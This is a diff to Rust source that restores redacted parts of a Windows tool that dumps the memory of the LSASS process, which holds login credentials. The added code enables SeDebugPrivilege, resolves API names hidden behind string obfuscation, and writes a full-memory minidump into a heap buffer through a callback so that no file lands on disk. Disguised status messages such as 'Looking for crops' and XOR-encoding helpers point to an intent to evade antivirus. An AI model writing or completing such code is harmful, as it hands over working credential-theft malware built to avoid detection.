@@ -21,15 +21,34 @@ use winapi::shared::winerror::S_OK;
 use winapi::shared::basetsd::DWORD_PTR;
 use winapi::shared::minwindef::LPVOID;
 use winapi::um::winnt::RtlCopyMemory;
-use winapi::shared::FARPROC;
+use winapi::shared::minwindef::FARPROC;
 use winapi::shared::minwindef::DWORD;
 use winapi::shared::basetsd::SIZE_T;
 use winapi::shared::minwindef::LPCVOID;
 #[derive(PartialEq, Eq)]
 struct MINIDUMP_CALLBACK_TYPE(pub i32);
 impl MINIDUMP_CALLBACK_TYPE {
-           /*REDACTED*/
-
+    const ModuleCallback: Self = Self(0);
+    const ThreadCallback: Self = Self(1);
+    const ThreadExCallback: Self = Self(2);
+    const IncludeThreadCallback: Self = Self(3);
+    const IncludeModuleCallback: Self = Self(4);
+    const MemoryCallback: Self = Self(5);
+    const CancelCallback: Self = Self(6);
+    const WriteKernelMinidumpCallback: Self = Self(7);
+    const KernelMinidumpStatusCallback: Self = Self(8);
+    const RemoveMemoryCallback: Self = Self(9);
+    const IncludeVmRegionCallback: Self = Self(10);
+    const IoStartCallback: Self = Self(11);
+    const IoWriteAllCallback: Self = Self(12);
+    const IoFinishCallback: Self = Self(13);
+    const ReadMemoryFailureCallback: Self = Self(14);
+    const SecondaryFlagsCallback: Self = Self(15);
+    const IsProcessSnapshotCallback: Self = Self(16);
+    const VmStartCallback: Self = Self(17);
+    const VmQueryCallback: Self = Self(18);
+    const VmPreReadCallback: Self = Self(19);
+    const VmPostReadCallback: Self = Self(20);
 }
 
 #[allow(dead_code)]
@@ -123,8 +142,43 @@ pub fn minidump_callback_routine(buf: &mut *mut c_void, callbackInput: MINIDUMP_
             return true
         },
         MINIDUMP_CALLBACK_TYPE::IoWriteAllCallback => {
-         /*REDACTED*/
+            callbackOutput.status = S_OK;
+            let read_buf_size = callbackInput.io.buffer_bytes;
+            let GetProcessHeap = get_process_heap().unwrap();
+            let HeapSize = heap_size().unwrap();
+            let HeapReAlloc = heap_realloc().unwrap();
+            let current_buf_size = unsafe { HeapSize(
+                GetProcessHeap(),
+                0 as _,
+                *buf
+            ) };
+            // check if buffer is large enough
+            let extra_5mb: usize = 1024*1024 * 5;
+            let bytes_and_offset = callbackInput.io.offset as usize + callbackInput.io.buffer_bytes as usize;
+            if bytes_and_offset >= current_buf_size {
+                // increase heap size
+                let size_to_increase = if bytes_and_offset <= (current_buf_size*2) {
+                    current_buf_size * 2
+                } else {
+                    bytes_and_offset + extra_5mb
+                };
+                *buf = unsafe { HeapReAlloc(
+                    GetProcessHeap(),
+                    0 as _,
+                    *buf,
+                    size_to_increase
+                )};
+            }
 
+            let source = callbackInput.io.buffer as *mut c_void;
+            let destination = (*buf as DWORD_PTR + callbackInput.io.offset as DWORD_PTR) as LPVOID;
+            let _ =  unsafe {
+                RtlCopyMemory(
+                    destination,
+                    source,
+                    read_buf_size as usize
+                )
+            };
             return true
         },
         MINIDUMP_CALLBACK_TYPE::IoFinishCallback => {
@@ -137,23 +191,103 @@ pub fn minidump_callback_routine(buf: &mut *mut c_void, callbackInput: MINIDUMP_
     }
 }
 use winapi::um::winnt::PTOKEN_PRIVILEGES;
-use winapi::shared::PDWORD;
+use winapi::shared::minwindef::PDWORD;
 use winapi::um::winnt::TOKEN_ADJUST_PRIVILEGES;
 use winapi::um::winnt::TOKEN_QUERY;
 use winapi::um::winnt::SE_PRIVILEGE_ENABLED;
 use winapi::um::winnt::LUID_AND_ATTRIBUTES;
 use winapi::shared::winerror::ERROR_NOT_ALL_ASSIGNED;
-use winapi::um::TOKEN_PRIVILEGES;
+use winapi::um::winnt::TOKEN_PRIVILEGES;
 use winapi::um::winnt::SE_DEBUG_NAME;
 use core::mem::size_of;
 use std::mem::{forget, MaybeUninit, size_of_val};
 use rand::prelude::*;
-
-
-
 fn enable_sedebug() -> bool {
     // get DLL handles and locate functions
-        /*REDACTED*/
+    let k32_handle = get_dll(obfstr::obfstr!("kernel32.dll"));
+    let a32_handle = get_dll(obfstr::obfstr!("advapi32.dll"));
+    let gcp_func = get_fn(k32_handle, obfstr::obfstr!("GetCurrentProcess\0"));
+    let opt_func = get_fn(a32_handle, obfstr::obfstr!("OpenProcessToken\0"));
+    let lpvw_func = get_fn(a32_handle, obfstr::obfstr!("LookupPrivilegeValueW\0"));
+    let atp_func = get_fn(a32_handle, obfstr::obfstr!("AdjustTokenPrivileges\0"));
+    let gle_func = get_fn(k32_handle, obfstr::obfstr!("GetLastError\0"));
+    let ch_func = get_fn(k32_handle, obfstr::obfstr!("CloseHandle\0"));
+
+    // define functions
+    let GetCurrentProcess: unsafe fn(
+    ) -> HANDLE = unsafe { std::mem::transmute(gcp_func as FARPROC) };
+
+    let OpenProcessToken: unsafe fn(
+        HANDLE,
+        DWORD,
+        *mut HANDLE,
+    ) -> bool = unsafe { std::mem::transmute(opt_func as FARPROC) };
+
+    let LookupPrivilegeValueW: unsafe fn(
+        LPCWSTR,
+        LPCWSTR,
+        *mut LUID,
+    ) -> bool = unsafe { std::mem::transmute(lpvw_func as FARPROC) };
+
+    let AdjustTokenPrivileges: unsafe fn(
+        HANDLE,
+        BOOL,
+        PTOKEN_PRIVILEGES,
+        DWORD,
+        PTOKEN_PRIVILEGES,
+        PDWORD,
+    ) -> bool = unsafe { std::mem::transmute(atp_func as FARPROC) };
+
+    let GetLastError: unsafe fn(
+    ) -> DWORD = unsafe { std::mem::transmute(gle_func as FARPROC) };
+
+    let CloseHandle: unsafe fn(
+        HANDLE
+    ) -> bool = unsafe { std::mem::transmute(ch_func as FARPROC) };
+
+    // Obtain token handle
+    let mut h_token: HANDLE = 0 as _;
+    let _ = unsafe { OpenProcessToken(
+        GetCurrentProcess(),
+        TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY,
+        &mut h_token,
+    )};
+
+    // Required privilege
+    let privs = LUID_AND_ATTRIBUTES {
+        Luid: LUID {
+            LowPart: 0,
+            HighPart: 0,
+        },
+        Attributes: SE_PRIVILEGE_ENABLED,
+    };
+    let mut tp = TOKEN_PRIVILEGES {
+        PrivilegeCount: 1,
+        Privileges: [privs ;1],
+    };
+    let _ = unsafe { LookupPrivilegeValueW(
+        0 as _,
+        get_wide(SE_DEBUG_NAME).as_mut_ptr(),
+        &mut tp.Privileges[0].Luid,
+    )};
+
+    // Enable the privilege
+    // ERROR HERE - STATUS_ACCESS_VIOLATION
+    let _ = unsafe { AdjustTokenPrivileges(
+        h_token,
+        false as _,
+        &mut tp,
+        size_of::<TOKEN_PRIVILEGES>() as _,
+        0 as _,
+        0 as _,
+    )};
+
+    // Check if privilege was enabled
+    if unsafe{ GetLastError() } == ERROR_NOT_ALL_ASSIGNED {
+        return false
+    }
+    let _ = unsafe { CloseHandle(h_token) };
+
 
     return true;
 }
@@ -164,7 +298,7 @@ use winapi::um::winnt::ACCESS_MASK;
 use winapi::um::psapi::PPROCESS_MEMORY_COUNTERS;
 use winapi::shared::minwindef::BOOL;
 use winapi::um::psapi::PROCESS_MEMORY_COUNTERS;
-use winapi::um::HEAP_ZERO_MEMORY;
+use winapi::um::winnt::HEAP_ZERO_MEMORY;
 
 use core::slice::from_raw_parts_mut;
 use std::{env, fs, thread};
@@ -237,6 +371,21 @@ fn main() {
 }
 fn dumpLsass(path: String) {
 
+    //let args: Vec<String> = env::args().collect();
+
+    /*if(args[1].contains("HELP"))
+    {
+        println!("[*] O ->0");
+        println!("[*] l ->1");
+        println!("[*] r ->2");
+        println!("[*] e ->3");
+        println!("[*] a ->4");
+        println!("[*] s ->5");
+        println!("[*] G ->8");
+        println!("[*] T ->7");
+        println!("[*] g ->9");
+        return;
+    }*/
 
     println!("  ______   ______   .___  ___. .______    __  .__   __.  _______
  /      | /  __  \\  |   \\/   | |   _  \\  |  | |  \\ |  | |   ____|
@@ -246,7 +395,31 @@ fn dumpLsass(path: String) {
  \\______| \\______/  |__|  |__| |______/  |__| |__| \\__| |_______|\
                                                                   \nHarvest professionals\n\n",);
 
+    /*if(args.len()>1&&args[1].contains("DXR"))
+    {
+        println!("Reading {:?}",&args[3]);
+        let file_path=&args[3];
+        let mut contents = fs::read(file_path)
+            .expect("Should have been able to read the file");
+        println!("[!] Reading file");
 
+        let mut data = [0u8; 1];
+        data[0]= u8::from_str_radix(&*args[2], 16).unwrap();
+
+
+        println!("[!] Xor key is {:x}", data[0]);
+
+        let mut n =0;
+        while n < contents.len() {
+            contents[n]^=data[0];
+            n +=1;
+        }
+        match fs::write(file_path.to_owned()+"out", &contents) {
+            Ok(_) => println!("\n[O] Data written to file successfully!"),
+            Err(e) => println!("\n[O] Error writing to file: {}", e),
+        }
+        return;
+    }*/
 
 
     let dbghelp_handle = get_dll(obfstr::obfstr!("C:\\Windows\\System32\\dbghelp.dll"));
@@ -313,9 +486,17 @@ fn dumpLsass(path: String) {
 
     #[allow(unused_assignments)]
         let mut handle: HANDLE = 0 as _;
-
-
-
+    /*if(args.len()>1)
+    {
+        let query = &args[1].replace("l","1")
+            .replace("g","9")
+            .replace("e","3")
+            .replace("r","2")
+            .replace("a","4")
+            .replace("s","5").replace("G","6").replace("T","7").replace("B","8");
+        pid = query.parse::<u32>().unwrap();
+        println!("{:?}",pid);
+    }*/
     println!("[!] Looking for crops");
     while unsafe { NtGetNextProcess(
         handle,
@@ -359,9 +540,22 @@ fn dumpLsass(path: String) {
 
     }
     let extra_5mb: usize = 1024*1024 * 5;
-    //get lsass memory size
-	        /*REDACTED*/
+    let buf_size: usize;
+    let mut pmc = MaybeUninit::<PROCESS_MEMORY_COUNTERS>::uninit();
+    let gpm_ret = unsafe { GetProcessMemoryInfo(
+        handle,
+        pmc.as_mut_ptr(),
+        size_of_val(&pmc) as DWORD
+    )};
+    let mut buf_size =100000;
+    if gpm_ret != 0 {
+        let pmc = unsafe { pmc.assume_init() };
+        buf_size = pmc.WorkingSetSize + extra_5mb;
+    } else {
+        nwg::simple_message("BAD", "Don't have enough bags");
 
+        return;
+    }
 
     // alloc memory in current process
     let GetProcessHeap = get_process_heap().unwrap();
@@ -380,7 +574,13 @@ fn dumpLsass(path: String) {
     };
 
     let _ = unsafe{ MiniDumpWriteDump(
-        /*REDACTED*/
+        handle,
+        pid,
+        0 as _,
+        0x00000002,//MINIDUMP_TYPE::MiniDumpWithFullMemory,
+        0 as _,
+        0 as _,
+        &mut callback_info
     )};
     let _ = unsafe { FreeLibrary(dbghelp_handle) };
 
